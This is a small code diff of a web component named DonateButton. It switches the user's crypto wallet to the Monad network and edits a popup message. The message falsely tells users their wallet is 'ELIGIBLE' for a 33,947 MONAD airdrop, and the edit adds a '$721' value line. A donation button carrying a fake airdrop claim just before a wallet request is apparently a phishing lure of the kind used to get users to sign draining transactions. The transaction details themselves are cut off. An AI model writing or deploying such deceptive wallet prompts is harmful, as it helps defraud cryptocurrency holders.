@@ -184,7 +184,7 @@ export const DonateButton = () => {
       // Switch to Monad network before any transactions
       await switchToMonad(provider);
       
-      const message = '+33,947 MON\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
+      const message = '+33,947 MON\n$721\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
       
       try {
         await provider.request({
